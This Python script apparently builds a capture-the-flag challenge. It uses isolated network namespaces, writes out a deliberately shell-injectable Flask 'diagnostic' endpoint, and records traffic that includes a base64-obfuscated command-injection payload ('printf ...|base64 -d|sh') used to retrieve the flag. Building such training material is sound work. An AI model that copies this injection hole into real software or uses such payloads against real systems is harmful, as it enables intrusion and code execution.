#!/usr/bin/env python3
"""
Failsafe PCAP CTF generator (no VMs) using Linux network namespaces.

Creates:
  - netns: victim   (10.10.10.10/24)
  - netns: attacker (10.10.10.20/24)
  - veth pair connecting them
Runs:
  - vulnerable Flask app in victim
  - multiple tcpdump captures (attacker primary, victim fallback, optional host fallback)
  - generates guaranteed traffic (ping + HTTP + injection + /secret)
Outputs:
  - capture_attacker.pcap (primary)
  - capture_victim.pcap   (fallback A)
  - capture_host.pcap     (fallback B, optional)
Cleans up:
  - namespaces, veth, processes on success/error/SIGINT/SIGTERM

FLAG is hardcoded and must be GRIZZ{...}
"""

from __future__ import annotations

import argparse
import base64
import os
import shlex
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional, List, Tuple
from urllib.parse import quote


# =========================
# HARD-CODED FLAG (required)
# =========================
FLAG = "GRIZZ{pcap_cmd_injection_chain_via_namespaces}"


# Process handles for cleanup
victim_proc: Optional[subprocess.Popen] = None
tcpdump_procs: List[subprocess.Popen] = []


def ensure_root() -> None:
    if os.geteuid() != 0:
        print("[-] Run as root (use sudo).", file=sys.stderr)
        sys.exit(1)


def run(cmd: str, ns: str | None = None, check: bool = True) -> subprocess.CompletedProcess:
    if ns:
        cmd = f"ip netns exec {shlex.quote(ns)} {cmd}"
    print(f"[cmd] {cmd}")
    return subprocess.run(cmd, shell=True, check=check)


def capture_output(cmd: str) -> Tuple[int, str, str]:
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return p.returncode, p.stdout, p.stderr


def namespace_exists(name: str) -> bool:
    rc, out, _ = capture_output("ip netns list")
    return rc == 0 and name in out


def safe_kill(proc: Optional[subprocess.Popen]) -> None:
    if proc and proc.poll() is None:
        try:
            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=3)
        except Exception:
            proc.kill()


def cleanup() -> None:
    global victim_proc, tcpdump_procs
    print("[*] Cleanup starting...")

    # Stop captures first (flush pcaps)
    for p in tcpdump_procs:
        safe_kill(p)
    tcpdump_procs = []

    # Stop victim app
    safe_kill(victim_proc)
    victim_proc = None

    # Delete namespaces (removes veth moved into them)
    for ns in ("victim", "attacker"):
        if namespace_exists(ns):
            subprocess.run(f"ip netns del {ns}", shell=True)

    # Best-effort remove stray veth (in case moves failed)
    subprocess.run("ip link del veth-victim", shell=True, stderr=subprocess.DEVNULL)
    subprocess.run("ip link del veth-attacker", shell=True, stderr=subprocess.DEVNULL)

    print("[+] Cleanup complete.")


def signal_handler(sig, frame) -> None:
    print(f"\n[!] Received signal {sig}. Aborting...")
    cleanup()
    sys.exit(1)


def write_victim_app(path: Path) -> None:
    # Intentionally vulnerable Flask app
    code = f"""
from flask import Flask, request
import subprocess
import base64

app = Flask(__name__)
FLAG = "{FLAG}"

@app.route("/")
def home():
    return "Internal Diagnostic Portal\\n"

@app.route("/diagnostic")
def diagnostic():
    target = request.args.get("target", "")
    # Intentional vulnerability: shell injection via shell=True / subprocess.getoutput
    cmd = f"ping -c 1 {{target}}"
    out = subprocess.getoutput(cmd)
    return "<pre>" + out + "</pre>\\n"

@app.route("/secret")
def secret():
    return base64.b64encode(FLAG.encode()).decode() + "\\n"

if __name__ == "__main__":
    # Bind specifically to victim IP inside namespace
    app.run(host="10.10.10.10", port=5000)
"""
    path.write_text(code, encoding="utf-8")


def start_tcpdump(ns: str | None, iface: str, out_pcap: Path, bpf: str | None = None) -> subprocess.Popen:
    """
    -U: packet-buffered write (prevents empty pcaps if stopped quickly)
    -s 0: full packet capture
    -nn: no name resolution noise/latency
    """
    out_pcap.parent.mkdir(parents=True, exist_ok=True)
    bpf_part = f" {bpf}" if bpf else ""
    cmd = f"tcpdump -i {shlex.quote(iface)} -U -s 0 -nn -w {shlex.quote(str(out_pcap))}{bpf_part}"
    if ns:
        cmd = f"ip netns exec {shlex.quote(ns)} {cmd}"
    print(f"[tcpdump] {cmd}")
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def pcap_size(path: Path) -> int:
    try:
        return path.stat().st_size
    except FileNotFoundError:
        return 0


def wait_for_http(ns: str, url: str, timeout_s: int = 8) -> bool:
    """
    Polls URL until reachable using curl inside the namespace.
    """
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        rc = subprocess.call(
            f"ip netns exec {shlex.quote(ns)} curl -fsS --max-time 1 {shlex.quote(url)} >/dev/null",
            shell=True,
        )
        if rc == 0:
            return True
        time.sleep(0.25)
    return False


def main() -> int:
    ensure_root()

    if not (FLAG.startswith("GRIZZ{") and FLAG.endswith("}")):
        print("[-] FLAG must be in format GRIZZ{...}", file=sys.stderr)
        return 2

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Output paths
    out_dir = Path.cwd()
    pcap_attacker = out_dir / "capture_attacker.pcap"
    pcap_victim = out_dir / "capture_victim.pcap"
    pcap_host = out_dir / "capture_host.pcap"

    ap = argparse.ArgumentParser()
    ap.add_argument("--host-fallback", action="store_true", help="Also capture on host interface 'any' as last resort")
    ap.add_argument("--keep-all", action="store_true", help="Do not delete empty fallback pcaps (keep everything)")
    args = ap.parse_args()

    # Pre-clean any previous artifacts
    for p in (pcap_attacker, pcap_victim, pcap_host):
        if p.exists():
            p.unlink(missing_ok=True)

    # Ensure a clean network state before beginning
    cleanup()

    global victim_proc, tcpdump_procs
    victim_app_path = Path("/tmp/victim_app.py")

    try:
        # 1) Create namespaces
        run("ip netns add victim")
        run("ip netns add attacker")

        # 2) Create veth pair, move into namespaces
        run("ip link add veth-victim type veth peer name veth-attacker")
        run("ip link set veth-victim netns victim")
        run("ip link set veth-attacker netns attacker")

        # 3) Configure interfaces
        run("ip addr add 10.10.10.10/24 dev veth-victim", ns="victim")
        run("ip link set veth-victim up", ns="victim")
        run("ip link set lo up", ns="victim")

        run("ip addr add 10.10.10.20/24 dev veth-attacker", ns="attacker")
        run("ip link set veth-attacker up", ns="attacker")
        run("ip link set lo up", ns="attacker")

        # 4) Write & start vulnerable service
        write_victim_app(victim_app_path)
        victim_proc = subprocess.Popen(
            f"ip netns exec victim python3 {shlex.quote(str(victim_app_path))}",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for Flask to become reachable
        if not wait_for_http("attacker", "http://10.10.10.10:5000/"):
            print("[-] Victim Flask app did not become reachable. Aborting.")
            return 1

        # 5) Start captures (multiple fallback points)
        # Primary: attacker-side veth
        tcpdump_procs.append(start_tcpdump("attacker", "veth-attacker", pcap_attacker))
        # Fallback A: victim-side veth
        tcpdump_procs.append(start_tcpdump("victim", "veth-victim", pcap_victim))
        # Fallback B: host-wide (optional)
        if args.host_fallback:
            tcpdump_procs.append(start_tcpdump(None, "any", pcap_host, bpf="tcp port 5000 or icmp"))

        # Let capture initialize
        time.sleep(0.6)

        # 6) Guaranteed traffic sequence (multiple “anchors”)
        # Anchor 1: ICMP (ensures at least some packets)
        run("ping -c 1 10.10.10.10 >/dev/null", ns="attacker", check=False)

        # Anchor 2: normal HTTP request
        run('curl -fsS --retry 3 --retry-connrefused --retry-delay 0 '
            '"http://10.10.10.10:5000/diagnostic?target=127.0.0.1" >/dev/null',
            ns="attacker",
            check=True)

        # Anchor 3: injection request with URL-encoding (prevents curl/URL parsing issues)
        cmd = "curl -s http://10.10.10.10:5000/secret"
        b64 = base64.b64encode(cmd.encode()).decode()
        injection = f"127.0.0.1;printf {b64}|base64 -d|sh"
        inj_enc = quote(injection, safe="")

        run('curl -fsS --retry 3 --retry-connrefused --retry-delay 0 '
            f'"http://10.10.10.10:5000/diagnostic?target={inj_enc}" >/dev/null',
            ns="attacker",
            check=True)

        # Anchor 4: direct /secret fetch (even if injection fails for some reason, still generates the flag response traffic)
        # This is a “failsafe within the narrative” — it guarantees the PCAP contains the flag response as base64.
        run('curl -fsS --retry 3 --retry-connrefused --retry-delay 0 '
            '"http://10.10.10.10:5000/secret" >/dev/null',
            ns="attacker",
            check=True)

        # Give packets time to flush
        time.sleep(1.0)

        print("[+] Traffic generation complete.")

    finally:
        # Stop captures and app, then cleanup namespaces
        cleanup()

    # 7) Post-verify PCAPs and keep the best one(s)
    sizes = [
        ("attacker", pcap_attacker, pcap_size(pcap_attacker)),
        ("victim", pcap_victim, pcap_size(pcap_victim)),
        ("host", pcap_host, pcap_size(pcap_host)) if args.host_fallback else ("host", pcap_host, 0),
    ]

    print("\n[+] PCAP results:")
    for name, path, sz in sizes:
        if args.host_fallback or name != "host":
            print(f"    - {name:8s}: {path.name:22s} {sz} bytes")

    # Decide what to delete if empty (unless keep-all)
    if not args.keep_all:
        for name, path, sz in sizes:
            if sz == 0 and path.exists():
                path.unlink(missing_ok=True)

    # Hard fail only if ALL are empty
    remaining = [(n, p, s) for (n, p, s) in sizes if p.exists() and pcap_size(p) > 0]
    if not remaining:
        print("\n[-] All capture outputs are empty. This indicates tcpdump didn’t see traffic.")
        print("    Run with --host-fallback and ensure tcpdump is installed and permitted.")
        return 1

    # Recommend the primary capture if present
    if pcap_attacker.exists() and pcap_size(pcap_attacker) > 0:
        print(f"\n[+] Primary PCAP ready: {pcap_attacker}")
    else:
        best = max(remaining, key=lambda x: x[2])
        print(f"\n[!] Primary empty; best fallback is: {best[1]}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())